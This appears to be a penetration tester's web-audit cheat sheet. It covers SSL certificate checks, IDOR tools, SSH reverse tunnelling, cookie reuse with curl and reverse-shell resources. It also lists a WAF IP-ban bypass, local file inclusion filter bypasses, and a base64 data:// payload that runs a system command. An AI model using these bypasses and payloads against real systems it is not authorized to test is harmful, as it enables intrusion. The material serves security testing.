---
title: "Web"
---

<p style="text-align: right">_- last update 02/12/2022 -_</p>

Owasp's [web security testing guide](https://owasp.org/www-project-web-security-testing-guide/stable/) is a great ressource for exhaustive web security audit.

## Vulnerability scanners

* [nessus](https://www.tenable.com/products/nessus)

## SSL Scans

[sslscan](https://github.com/rbsec/sslscan) is a great tool to detect ssl
vulnerabilities.

Verify that certificates are not self-signed with openssl:

```bash
for host in $(cat ssl_endpoints.txt); do
  echo ">>> $host"
  echo '' \
    | timeout 2 openssl s_client -port 443 -connect $host 2>/dev/null \
    | grep -i verification
done | tee openssl.txt
```

Oneliner:

```bash
for host in $(cat ssl_endpoints.txt); do echo ">>> $host"; echo '' | timeout 2 openssl s_client -port 443 -connect $host 2>/dev/null | grep -i verification; done | tee openssl_verifications.txt
```

Then you can easily filter the file:

```bash
> cat openssl_verifications.txt | grep -v 'Verification: OK' | grep -B1 Verification
```

Output exemple:

```txt
>>> testa.sample.fr
Verification error: self signed certificate in certificate chain
--
>>> testb.sample.fr
Verification error: unable to verify the first certificate
--
>>> testc.sample.fr
Verification error: certificate has expired
--
```

## IDORS

IDOR = **I**nsecure **D**irect **O**bject **R**eferences

Use the [ffuf](https://github.com/ffuf/ffuf) tool.

Http methods are also vulnerable to IDOR, use [httpmethods](https://github.com/ShutdownRepo/httpmethods)

## Bypass WAF

Adding an [X-Forwarded-For](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For) http header can override the WAF's one and bypass an IP banlist.

## Injections

Each tech has it's own injection technics:

* [php](./injections/php)
* [sql](./injections/sql)
* [nosql](./injections/nosql)
* [javascript](./injections/javascript)

## Reverse Connections

Tools:

* [request.bin](https://requestbin.com/)
* [ngrok](https://ngrok.com/)

It is possible copy the tools functionnalities locally using `ssh`:

Enable the `GatewayPorts` option from `sshd_config` file.

```bash
# cat /etc/ssh/sshd_config | grep Gateway
GatewayPorts yes
```

Then, you can expose a local port on interne (ex: python http server).

```bash
ssh -NR 4444:localhost:8000 tristan@tic.sh &
```

Here, local port `8000` will be published on `tic.sh`'s port `4444` and all
requests will be forwarded. Option `-N` avoid opening an interactive shell
on the target. (Don't forget to enable `ssh-agent` for the `&` to work)

## Reverse & Web Shell

[The pentestmonkey repo](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
contain a nice reverse proxy for **php**.

The variables `$ip` and `$port` must be changed, pointing to a listening netcat
connection. [Here](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) 
is a direct download.

There are also some great shells for other languages here:

* [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)
* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

## Breaking flash applications

Flash emulators:

* [ruffle](http://ruffle.rs/#)
* [lightspark](https://lightspark.github.io/)

## Working with cookies

You can reinject CSRF tokens with cookies files in Netscape format.

```bash
curl -X PATCH 'https://target.tld/api/path' \
  -H "X-XSRF-TOKEN: $(cat cookies.txt | grep XSRF | cut -d $'\t' -f 7)" \
  -b cookies.txt \
  -H 'content-type: application/json' 
  -d '{"enabled":false}'
```

[ExportCookies](https://github.com/rotemdan/ExportCookies) plugin on firefox
can extract cookies from website once authenticated.

You can also use the `--cookie-jar` option of curl.

## Local File Inclusions

Bypass **"filename extension" filter** by adding a null byte.

* `upload.php` => `upload.php%00.png`

Bypass **"relative paths" filter** by doubling path chars.

* `../upload.php` => `....//upload.php`

Bypass **"hardcoded filename" filter** by using the relative local path.

* `upload.php` => `./upload.php`

If you want to request a file that is postfixed with `.php` but don't want it to
be executed by the php server, there are special urls:

```txt
php://filter/convert.base64-encode/resource=FILE
```

Using [the right filter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-data) you can even get RCE:

```txt
data://text/plain;base64,PD9waHAgc3lzdGVtKCdob3N0bmFtZScpOyA/Pg==
```

(payload is base64 of `<?php system("hostname"); ?>`)
